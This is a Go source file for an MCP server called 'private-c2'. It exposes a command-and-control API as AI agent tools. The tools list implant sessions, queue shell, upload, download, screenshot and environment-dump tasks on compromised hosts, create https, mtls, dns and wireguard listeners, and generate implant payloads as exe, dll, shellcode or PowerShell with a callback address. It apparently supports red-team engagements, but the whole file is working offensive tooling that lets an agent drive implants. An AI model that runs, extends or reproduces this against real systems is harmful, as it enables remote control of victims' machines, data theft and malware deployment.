package main

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"

	"github.com/mark3labs/mcp-go/mcp"
	"github.com/mark3labs/mcp-go/server"
)

// c2Client wraps the C2 HTTP API with bearer-token auth.
type c2Client struct {
	baseURL    string
	token      string
	httpClient *http.Client
}

func (c *c2Client) authenticate(username, password string) error {
	body, _ := json.Marshal(map[string]string{
		"username": username,
		"password": password,
	})
	resp, err := c.httpClient.Post(c.baseURL+"/api/auth/login", "application/json", bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("connect to C2: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		data, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("login failed (HTTP %d): %s", resp.StatusCode, string(data))
	}

	var result struct {
		Token string `json:"token"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return fmt.Errorf("decode login response: %w", err)
	}
	c.token = result.Token
	return nil
}

func (c *c2Client) Get(path string) ([]byte, error) {
	req, err := http.NewRequest(http.MethodGet, c.baseURL+path, nil)
	if err != nil {
		return nil, fmt.Errorf("build request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+c.token)

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("GET %s: %w", path, err)
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}
	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(data))
	}
	return data, nil
}

func (c *c2Client) Post(path string, body interface{}) ([]byte, error) {
	jsonBody, err := json.Marshal(body)
	if err != nil {
		return nil, fmt.Errorf("marshal body: %w", err)
	}

	req, err := http.NewRequest(http.MethodPost, c.baseURL+path, bytes.NewReader(jsonBody))
	if err != nil {
		return nil, fmt.Errorf("build request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+c.token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("POST %s: %w", path, err)
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}
	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(data))
	}
	return data, nil
}

func main() {
	serverURL := flag.String("server", "", "C2 API URL (e.g. http://127.0.0.1:8080)")
	username := flag.String("username", "admin", "C2 operator username")
	password := flag.String("password", "admin", "C2 operator password")
	flag.Parse()

	if *serverURL == "" {
		log.Fatal("--server flag is required")
	}

	client := &c2Client{
		baseURL:    strings.TrimRight(*serverURL, "/"),
		httpClient: &http.Client{},
	}
	if err := client.authenticate(*username, *password); err != nil {
		log.Fatalf("C2 authentication failed: %v", err)
	}

	s := server.NewMCPServer("private-c2", "1.0.0")

	s.AddTool(
		mcp.NewTool("server_status",
			mcp.WithDescription("Get C2 server status: version, uptime, active sessions, memory usage"),
		),
		makeGetHandler(client, "/api/server/status"),
	)

	s.AddTool(
		mcp.NewTool("list_sessions",
			mcp.WithDescription("List all active implant sessions"),
		),
		makeGetHandler(client, "/api/sessions"),
	)

	s.AddTool(
		mcp.NewTool("get_session",
			mcp.WithDescription("Get detailed information about a specific implant session"),
			mcp.WithString("session_id", mcp.Required(), mcp.Description("Session UUID")),
		),
		func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
			id, err := req.RequireString("session_id")
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}
			data, err := client.Get("/api/sessions/" + id)
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}
			return mcp.NewToolResultText(string(data)), nil
		},
	)

	s.AddTool(
		mcp.NewTool("run_task",
			mcp.WithDescription("Queue a task on an implant session. Returns a task_id — use get_task_result to poll for output."),
			mcp.WithString("session_id", mcp.Required(), mcp.Description("Target session UUID")),
			mcp.WithString("task_type", mcp.Required(), mcp.Description("Task type: shell, ls, pwd, cd, ps, cat, upload, download, screenshot, ifconfig, netstat, arp, traceroute, whoami, env, id")),
			mcp.WithString("args", mcp.Description("Task arguments (e.g. command for shell, path for ls/cat)")),
		),
		func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
			sessionID, err := req.RequireString("session_id")
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}
			taskType, err := req.RequireString("task_type")
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}
			args := req.GetString("args", "")

			body := map[string]string{"type": taskType, "args": args}
			data, err := client.Post("/api/sessions/"+sessionID+"/task", body)
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}
			return mcp.NewToolResultText(string(data)), nil
		},
	)

	s.AddTool(
		mcp.NewTool("get_task_result",
			mcp.WithDescription("Get the result of a previously queued task. Returns pending status or completed output."),
			mcp.WithString("task_id", mcp.Required(), mcp.Description("Task UUID returned by run_task")),
		),
		func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
			id, err := req.RequireString("task_id")
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}
			data, err := client.Get("/api/tasks/" + id)
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}
			return mcp.NewToolResultText(string(data)), nil
		},
	)

	s.AddTool(
		mcp.NewTool("list_listeners",
			mcp.WithDescription("List all C2 listeners and their status"),
		),
		makeGetHandler(client, "/api/listeners"),
	)

	s.AddTool(
		mcp.NewTool("create_listener",
			mcp.WithDescription("Create a new C2 listener"),
			mcp.WithString("type", mcp.Required(), mcp.Description("Listener type: https, mtls, dns, wireguard")),
			mcp.WithString("bind_addr", mcp.Required(), mcp.Description("Bind address (e.g. 0.0.0.0)")),
			mcp.WithNumber("port", mcp.Required(), mcp.Description("Listen port")),
		),
		func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
			lType, err := req.RequireString("type")
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}
			bindAddr, err := req.RequireString("bind_addr")
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}
			port, err := req.RequireFloat("port")
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}

			body := map[string]interface{}{
				"type":      lType,
				"bind_addr": bindAddr,
				"port":      int(port),
			}
			data, err := client.Post("/api/listeners", body)
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}
			return mcp.NewToolResultText(string(data)), nil
		},
	)

	s.AddTool(
		mcp.NewTool("list_payloads",
			mcp.WithDescription("List all generated payload artifacts"),
		),
		makeGetHandler(client, "/api/payloads"),
	)

	s.AddTool(
		mcp.NewTool("generate_payload",
			mcp.WithDescription("Generate a new implant payload binary. Returns payload metadata with id and sha256."),
			mcp.WithString("target_os", mcp.Required(), mcp.Description("Target OS: windows, linux, darwin")),
			mcp.WithString("target_arch", mcp.Description("Target architecture (default: amd64)")),
			mcp.WithString("mode", mcp.Description("Implant mode: beacon or session (default: beacon)")),
			mcp.WithString("transports", mcp.Description("Comma-separated transports: mtls, https, dns, wireguard (default: mtls)")),
			mcp.WithString("c2_server", mcp.Required(), mcp.Description("C2 callback address (e.g. 10.0.0.1:4444)")),
			mcp.WithString("format", mcp.Description("Output format: exe, dll, shellcode, shared, ps1, sh (default: exe)")),
			mcp.WithString("engagement_id", mcp.Description("Engagement UUID to associate the payload with")),
		),
		func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
			targetOS, err := req.RequireString("target_os")
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}
			c2Server, err := req.RequireString("c2_server")
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}

			arch := req.GetString("target_arch", "amd64")
			mode := req.GetString("mode", "beacon")
			transports := req.GetString("transports", "mtls")
			format := req.GetString("format", "exe")
			engagementID := req.GetString("engagement_id", "")

			body := map[string]interface{}{
				"target_os":   targetOS,
				"target_arch": arch,
				"mode":        mode,
				"transports":  transports + "@" + c2Server,
				"format":      format,
			}
			if engagementID != "" {
				body["engagement_id"] = engagementID
			}

			data, err := client.Post("/api/payloads/generate", body)
			if err != nil {
				return mcp.NewToolResultError(err.Error()), nil
			}
			return mcp.NewToolResultText(string(data)), nil
		},
	)

	s.AddTool(
		mcp.NewTool("list_engagements",
			mcp.WithDescription("List all engagements with scope and status"),
		),
		makeGetHandler(client, "/api/engagements"),
	)

	if err := server.ServeStdio(s); err != nil {
		log.Fatalf("MCP server error: %v", err)
	}
}

func makeGetHandler(client *c2Client, path string) server.ToolHandlerFunc {
	return func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		data, err := client.Get(path)
		if err != nil {
			return mcp.NewToolResultError(err.Error()), nil
		}
		return mcp.NewToolResultText(string(data)), nil
	}
}
